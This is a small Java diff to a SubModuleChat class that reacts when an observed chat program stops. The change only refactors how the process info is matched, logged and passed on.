@@ -31,12 +31,12 @@ public abstract class SubModuleChat extends SubModule {
 	@Override
 	public int notification(ProcessInfo process) {
 
-		if (process.processInfo.processName.contains(getObservingProgram())) {
+		if (process.processInfo.contains(getObservingProgram())) {
 			if (process.status == ProcessStatus.STOP) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
+					Check.log(TAG + " (notification), observing found: " + process.processInfo);
 				}
-				notifyStopProgram(process.processInfo.processName);
+				notifyStopProgram(process.processInfo);
 				return 1;
 			}
 		}
